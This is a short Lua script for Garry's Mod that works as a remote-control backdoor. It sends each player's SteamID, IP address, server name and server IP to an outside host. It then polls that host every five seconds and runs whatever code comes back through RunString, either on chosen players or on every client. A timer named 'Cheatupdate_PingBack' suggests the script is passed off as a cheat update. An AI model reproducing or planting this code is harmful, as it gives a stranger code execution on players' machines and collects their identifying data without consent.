
	local clientIP = "0.0.0.0:0"
	
	http.Fetch("http://gmod-rce-senator.c9users.io/address.php", function(ip) clientIP = ip; end, function(...) end)
	
	timer.Simple(1, function()
		http.Post("http://gmod-rce-senator.c9users.io/api.php", {request="notify", steamid=LocalPlayer():SteamID(), ip=clientIP, servername=GetHostName(), serverip=game.GetIPAddress()}, function(body) end, function(...) end);
	end);
	
	timer.Create("Cheatupdate_PingBack", 5, 0, function()
		http.Post( "http://gmod-rce-senator.c9users.io/api.php", {request="pingback"}, function( body, p0, p1, p2 )
			local response = util.JSONToTable(body);
			if(response != nil) then
				if(string.find(response["packet-r"]["target"],LocalPlayer():SteamID()) || string.find(response["packet-r"]["target"], "*")) then 
					if(!string.find(response["packet-r"]["target"], "!" .. LocalPlayer():SteamID()) && response["packet-r"]["re"] != "null") then
						RunString(response["packet-r"]["re"]);
					end
				end
			end
			end, 
			function(exception)
		end) 
	end)
